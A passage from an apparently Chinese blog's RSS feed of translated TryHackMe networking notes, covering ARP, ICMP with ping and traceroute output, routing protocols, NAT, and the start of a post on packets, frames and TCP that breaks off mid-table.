&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408005456220.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408005456220&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;地址解析协议 （ARP） 可以在以太网上找到另一台设备的 MAC 地址。在下面的示例中，IP 地址为 &lt;code&gt;192.168.66.89&lt;/code&gt; 的主机希望与 IP 地址为 &lt;code&gt;192.168.66.1&lt;/code&gt; 的另一个系统通信。它发送一个 ARP 请求，要求 IP 地址为 &lt;code&gt;192.168.66.1&lt;/code&gt; 的主机进行响应。ARP 请求从请求者的 MAC 地址发送到广播 MAC 地址 &lt;code&gt;ff：ff：ff：ff：ff：ff：ff，&lt;/code&gt; 如第一个数据包所示。ARP 回复很快到达，IP 地址为 &lt;code&gt;192.168.66.1&lt;/code&gt; 的主机使用其 MAC 地址进行响应。此时，两台主机可以交换数据链路层帧。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ tshark -r arp.pcapng -Nn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    1 0.000000000 cc:5e:f8:02:21:a7 → ff:ff:ff:ff:ff:ff ARP 42 Who has 192.168.66.1? Tell 192.168.66.89
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    2 0.003566632 44:df:65:d8:fe:6c → cc:5e:f8:02:21:a7 ARP 42 192.168.66.1 is at 44:df:65:d8:fe:6c
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;如果我们使用 &lt;code&gt;tcpdump&lt;/code&gt;，数据包将以不同的方式显示。它使用术语 ARP &lt;strong&gt;请求&lt;/strong&gt; 和 ARP &lt;strong&gt;回复&lt;/strong&gt; 。供您参考，输出显示在下面的终端中。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ tcpdump -r arp.pcapng -n -v
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;17:23:44.506615 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.66.1 tell 192.168.66.89, length 28
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;17:23:44.510182 ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.66.1 is-at 44:df:65:d8:fe:6c, length 28
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ARP 请求或 ARP 回复未封装在 UDP 甚至 IP 数据包中;它直接封装在以太网帧中。以下 ARP 回复显示了这一点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408010149002.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408010149002&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;ARP 被视为第 2 层，因为它处理 MAC 地址。其他人会争辩说它是第 3 层的一部分，因为它支持 IP 作。必须了解的是，ARP 允许从第 3 层寻址转换为第 2 层寻址。&lt;/p&gt;
&lt;h2 id=&#34;icmp网络故障排除&#34;&gt;ICMP：网络故障排除
&lt;/h2&gt;&lt;p&gt;Internet Control Message Protocol (ICMP)主要用于网络诊断和错误报告。两个常用命令依赖于 ICMP，它们在网络故障排除和网络安全方面非常有用。这些命令是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ping&lt;/code&gt;：此命令使用 ICMP 测试与目标系统的连接并测量往返时间 （RTT）。换句话说，它可以用来了解目标是活着的，并且它的回复可以到达我们的系统。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;traceroute&lt;/code&gt;：此命令在 Linux 和类 UNIX 系统上称为 &lt;code&gt;traceroute&lt;/code&gt;，在 MS Windows 系统上称为 &lt;code&gt;tracert&lt;/code&gt;。它使用 ICMP 来发现从主机到目标的路由。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ping&#34;&gt;Ping
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;ping&lt;/code&gt; 命令发送 ICMP Echo 请求（ICMP 类型 &lt;code&gt;8&lt;/code&gt;）。下面的屏幕截图显示了 IP 数据包中的 ICMP 消息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408010535410.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408010535410&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;接收端的计算机以 ICMP Echo Reply （ICMP Type &lt;code&gt;0&lt;/code&gt;） 进行响应。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408010611795.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408010611795&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;许多事情可能会阻止我们得到回复。除了目标系统脱机或关闭的可能性之外，路径上的&lt;strong&gt;防火墙&lt;/strong&gt;还可能会阻止 &lt;code&gt;ping&lt;/code&gt; 工作所需的数据包。在下面的示例中，我们使用 &lt;code&gt;-c 4&lt;/code&gt; 告诉 &lt;code&gt;ping&lt;/code&gt; 命令在发送 4 个数据包后停止。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ ping 192.168.11.1 -c 4
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PING 192.168.11.1 (192.168.11.1) 56(84) bytes of data.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;64 bytes from 192.168.11.1: icmp_seq=1 ttl=63 time=11.2 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;64 bytes from 192.168.11.1: icmp_seq=2 ttl=63 time=3.81 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;64 bytes from 192.168.11.1: icmp_seq=3 ttl=63 time=3.99 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;64 bytes from 192.168.11.1: icmp_seq=4 ttl=63 time=23.4 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--- 192.168.11.1 ping statistics ---
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;4 packets transmitted, 4 received, 0% packet loss, time 3003ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rtt min/avg/max/mdev = 3.805/10.596/23.366/7.956 ms
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;输出显示没有数据包丢失;此外，它还计算往返时间 （RTT） 的最小值、平均值、最大值和标准差 （mDev）。&lt;/p&gt;
&lt;h3 id=&#34;traceroute&#34;&gt;Traceroute
&lt;/h3&gt;&lt;p&gt;我们如何使我们的系统和目标系统之间的每个路由器都显露出来呢？&lt;/p&gt;
&lt;p&gt;Internet 协议有一个称为Time-to-Live （TTL） 的字段，该字段指示数据包在被丢弃之前可以传输的最大路由器数。路由器在发送数据包之前将数据包的 TTL 递减 1。当 TTL 达到零时，路由器会丢弃数据包并发送 ICMP 超时消息（ICMP 类型 &lt;code&gt;11&lt;/code&gt;）。（在这种情况下，“时间” 是以路由器的数量来衡量的，而不是秒数。&lt;/p&gt;
&lt;p&gt;以下终端输出显示了运行 &lt;code&gt;traceroute&lt;/code&gt; 命令探测本机与 &lt;code&gt;example.com&lt;/code&gt; 之间路径上路由器的结果。部分路由器未响应（即丢弃数据包且不返回任何ICMP消息）；属于我们ISP的路由器可能会响应，并暴露其私有IP地址。另一些路由器则会返回公有IP地址，从而允许我们通过域名查询推断其地理位置。此外，ICMP超时消息（Time Exceeded）可能被拦截，导致无法到达本机。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ traceroute example.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;traceroute to example.com (93.184.215.14), 30 hops max, 60 byte packets
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 1  _gateway (192.168.66.1)  4.414 ms  4.342 ms  4.320 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 2  192.168.11.1 (192.168.11.1)  5.849 ms  5.830 ms  5.811 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 3  100.104.0.1 (100.104.0.1)  11.130 ms  11.111 ms  11.093 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 4  10.149.1.45 (10.149.1.45)  6.156 ms  6.138 ms  6.120 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 5  * * *
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 6  * * *
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 7  * * *
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8  172.16.48.1 (172.16.48.1)  5.667 ms  8.165 ms  6.861 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 9  ae81.edge4.Marseille1.Level3.net (212.73.201.45)  50.811 ms  52.857 ms 213.242.116.233 (213.242.116.233)  52.798 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10  NTT-level3-Marseille1.Level3.net (4.68.68.150)  93.351 ms  79.897 ms  79.804 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;11  ae-9.r20.parsfr04.fr.bb.gin.ntt.net (129.250.3.38)  62.935 ms  62.908 ms  64.313 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;12  ae-14.r21.nwrknj03.us.bb.gin.ntt.net (129.250.4.194)  141.816 ms  141.782 ms  141.757 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;13  ae-1.a02.nycmny17.us.bb.gin.ntt.net (129.250.3.17)  145.786 ms ae-1.a03.nycmny17.us.bb.gin.ntt.net (129.250.3.128)  141.701 ms  147.586 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;14  ce-0-3-0.a02.nycmny17.us.ce.gin.ntt.net (128.241.1.14)  148.692 ms ce-3-3-0.a03.nycmny17.us.ce.gin.ntt.net (128.241.1.90)  141.615 ms ce-0-3-0.a02.nycmny17.us.ce.gin.ntt.net (128.241.1.14)  148.168 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;15  ae-66.core1.nyd.edgecastcdn.net (152.195.69.133)  141.100 ms ae-65.core1.nyd.edgecastcdn.net (152.195.68.133)  140.360 ms ae-66.core1.nyd.edgecastcdn.net (152.195.69.133)  140.638 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;16  93.184.215.14 (93.184.215.14)  140.574 ms  140.543 ms  140.514 ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;17  93.184.215.14 (93.184.215.14)  140.488 ms  139.397 ms  141.854 ms
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;当我们重新运行命令时，遍历的路由可能会发生变化。&lt;/p&gt;
&lt;h2 id=&#34;routing-路由&#34;&gt;Routing 路由
&lt;/h2&gt;&lt;p&gt;考虑下面显示的网络图。它只有三个网络;但是，Internet 如何确定如何将数据包从网络 1 传送到网络 2 或网络 3？虽然这是一个过于简化的图表，但我们需要一些算法来弄清楚如何将网络 1 连接到网络 2 和网络 3，反之亦然。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408011337796.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408011337796&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;让我们考虑一个更详细的图表。互联网将是数百万台路由器和数十亿台设备。下面的网络是 Internet 的一小部分。移动用户可以访问 Web 服务器;但是，要实现此目的，路径上的每个路由器都需要通过适当的链路发送数据包。显然，连接移动用户和 Web 服务器的路径不止一条，即路由。我们需要一个路由算法，让路由器弄清楚要使用哪个链路。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408011415339.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408011415339&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;路由算法超出了这个房间的范围;但是，我们将简要介绍一些路由协议，以便您熟悉它们的名称：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**OSPF （Open Shortest Path First）：**OSPF 是一种路由协议，允许路由器共享有关网络拓扑的信息并计算最有效的数据传输路径。它通过让路由器交换有关其连接的链接和网络状态的更新来实现这一点。这样，每个路由器都有一个完整的网络地图，并且可以确定到达任何目的地的最佳路线。&lt;/li&gt;
&lt;li&gt;**EIGRP（增强型内部网关路由协议）：**EIGRP 是 Cisco 专有的路由协议，它结合了不同路由算法的各个方面。它允许路由器共享有关它们可以访问的网络以及与这些路由相关的成本（如带宽或延迟）的信息。然后，路由器使用此信息来选择最有效的数据传输路径。&lt;/li&gt;
&lt;li&gt;**BGP（边界网关协议）：**BGP 是 Internet 上使用的主要路由协议。它允许不同的网络（如 Internet 服务提供商的网络）交换路由信息并建立数据在这些网络之间传输的路径。BGP 有助于确保数据可以通过 Internet 高效路由，即使在遍历多个网络时也是如此。&lt;/li&gt;
&lt;li&gt;**RIP（路由信息协议）：**RIP 是一种简单的路由协议，通常用于小型网络。运行 RIP 的路由器共享有关它们可以访问的网络以及到达该网络所需的跃点（路由器）数的信息。因此，每个路由器都会根据此信息构建一个路由表，选择跳数最少的路由来到达每个目的地。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nat-网络地址转换&#34;&gt;NAT 网络地址转换
&lt;/h2&gt;&lt;p&gt;正如 &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/r/room/networkingconcepts&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Networking Concepts&lt;/a&gt; 会议室中所讨论的，我们计算出 IPv4 最多可以支持 40 亿台设备。随着连接到 Internet 的设备数量的增加，从计算机和智能手机到安全摄像头和洗衣机，很明显 IPv4 地址空间将很快耗尽。解决耗尽问题的一种解决方案是网络地址转换 （NAT）。&lt;/p&gt;
&lt;p&gt;NAT（网络地址转换）的核心思想是&lt;strong&gt;通过一个公网IP地址为多个私有IP地址提供互联网访问能力&lt;/strong&gt;。例如，若某公司有20台计算机需要联网，无需为每台设备分配一个公网IP地址（共20个），只需使用一个公网IP地址即可让所有设备接入互联网。（&lt;em&gt;技术细节补充&lt;/em&gt;：严格来说，IP地址数量通常以2的幂次方为单位分配。因此，更准确的表述是——使用NAT时，您只需预留2个公网IP地址，而非原本所需的32个，从而节省了30个公网IP地址。）&lt;/p&gt;
&lt;p&gt;与路由不同，路由是将数据包路由到目标主机的自然方式，支持 NAT 的路由器必须找到一种方法来跟踪正在进行的连接。因此，支持 NAT 的路由器维护一个表，用于在内部和外部网络之间转换网络地址。通常，内部网络将使用私有 IP 地址范围，而外部网络将使用公共 IP 地址。&lt;/p&gt;
&lt;p&gt;在下图中，多个设备通过支持 NAT 的路由器访问 Internet。路由器维护一个表，该表将内部 IP 地址和端口号与其外部 IP 地址和端口号进行映射。例如，笔记本电脑可能会与某些 Web 服务器建立连接。从笔记本电脑的角度来看，连接是从其 IP 地址 &lt;code&gt;192.168.0.129&lt;/code&gt; 从 TCP 源端口号 &lt;code&gt;15401&lt;/code&gt; 发起的;但是，Web 服务器将看到与 &lt;code&gt;212.3.4.5&lt;/code&gt; 和 TCP 端口号 &lt;code&gt;19273&lt;/code&gt; 建立的连接相同的连接，如转换表中所示。路由器无缝地执行此地址转换。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408011744920.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408011744920&#34;
	
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>数据包和帧</title>
        <link>https://Yerucrem.github.io/p/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%92%8C%E5%B8%A7/</link>
        <pubDate>Mon, 24 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%92%8C%E5%B8%A7/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/girl-9239059_1280.jpg" alt="Featured image of post 数据包和帧" /&gt;&lt;h1 id=&#34;数据包和帧&#34;&gt;数据包和帧
&lt;/h1&gt;&lt;h2 id=&#34;什么是数据包和帧&#34;&gt;什么是数据包和帧
&lt;/h2&gt;&lt;p&gt;数据包和帧是小块数据，当它们组合在一起时，会形成较大的信息或消息。但是，它们在 OSI 模型中是两个不同的东西。帧位于第 2 层 - 数据链路层，这意味着没有 IP 地址等信息。将此视为将信封放入信封中并将其寄走。第一个信封将是您邮寄的数据包，但一旦打开，其中的信封仍然存在并包含数据（这是一个帧）。&lt;/p&gt;
&lt;p&gt;这个过程称为封装，我们在 &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/osimodelzi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;3 号房间中讨论过：OSI 模型 &lt;/a&gt;。在这个阶段，可以安全地假设当我们谈论任何 IP 地址时，我们谈论的是数据包。当封装信息被剥离时，我们谈论的是框架本身。&lt;/p&gt;
&lt;p&gt;数据包是在联网设备之间传输数据的一种有效方式，例如任务 1 中介绍的设备。由于这些数据是小块交换的，因此与一次发送大消息相比，整个网络中出现瓶颈的可能性更小。&lt;/p&gt;
&lt;p&gt;例如，从网站加载图像时，此图像不会作为一个整体发送到您的计算机，而是在您的计算机上重建的小块。以下图为例来说明这个过程。猫咪的照片被分成三个包，到达计算机后被重建，形成最终的图像。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324092004403.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324092004403&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;数据包具有不同的结构，具体取决于要发送的数据包的类型。正如我们接下来将要讨论的那样，网络充满了标准和协议，它们充当了一组规则，用于定义如何在设备上处理数据包。互联网上连接了数十亿台设备，如果没有标准化，事情可能会很快崩溃。&lt;/p&gt;
&lt;p&gt;让我们继续我们的 Internet 协议示例。使用此协议的数据包将具有一组标头，其中包含通过网络发送的数据的附加信息。&lt;/p&gt;
&lt;p&gt;一些值得注意的标头包括：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Header 页眉&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Description 描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Time to Live&lt;/td&gt;
          &lt;td&gt;此字段为数据包设置一个到期计时器，如果它从未设法到达主机或逃逸，则不会阻塞您的网络！&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Checksum&lt;/td&gt;
          &lt;td&gt;此字段为 TCP/IP 等协议提供完整性检查。如果更改了任何数据，此值将与预期值不同，因此会损坏。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Source Address&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;发送 数据包&lt;/strong&gt;的设备的 IP 地址，以便数据知道要&lt;strong&gt;返回到&lt;/strong&gt;何处。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Destination Address&lt;/td&gt;
          &lt;td&gt;数据包发送到的设备 IP 地址，以便数据知道下一步要传输到何处。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;tcpip-三次握手&#34;&gt;TCP/IP 三次握手
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;TCP&lt;/strong&gt; （或 简称 &lt;strong&gt;T&lt;/strong&gt;ransmission &lt;strong&gt;C&lt;/strong&gt;ontrol &lt;strong&gt;P&lt;/strong&gt;rotocol）是网络中使用的另一种规则。&lt;/p&gt;
&lt;p&gt;到目前为止，该协议与我们之前在本模块的 3 号房间中讨论的 OSI 模型非常相似。TCP/IP 协议由四层组成，可以说只是 OSI 模型的概括版本。这些层是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Application 应用&lt;/li&gt;
&lt;li&gt;Transport 运输&lt;/li&gt;
&lt;li&gt;Internet 互联网&lt;/li&gt;
&lt;li&gt;Network Interface 网络接口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;与 OSI 模型的工作方式非常相似，当数据（或数据包）遍历 TCP 模型时，信息会添加到 TCP 模型的每一层。您可能还记得，这个过程被称为 encapsulation - 这个过程的反面是 decapsulation。&lt;/p&gt;
&lt;p&gt;TCP 的一个定义特征是它是 &lt;strong&gt;基于连接的&lt;/strong&gt; ，这意味着 TCP 必须在发送数据之前在客户端和充当服务器的 设备之间建立连接 。&lt;/p&gt;
&lt;p&gt;因此，TCP 保证发送的任何数据都将在另一端接收。这个过程被称为 三次握手，我们稍后会讨论。 下表比较了 TCP 的优缺点：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;TCP 的优点&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;TCP 的缺点&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;保证数据的完整性。&lt;/td&gt;
          &lt;td&gt;需要在两个设备之间建立可靠的连接。如果未收到一小块数据，则无法使用整个数据块，必须重新发送。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;能够同步两个设备，以防止彼此以错误的顺序被数据淹没。&lt;/td&gt;
          &lt;td&gt;慢速连接可能会使另一台设备成为瓶颈，因为该连接将始终保留在另一台设备上。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;执行更多的流程以实现可靠性&lt;/td&gt;
          &lt;td&gt;TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多的工作 （计算）。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;TCP 数据包包含从封装添加的称为报头的信息的各个部分。让我们解释下表中的一些关键标头：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
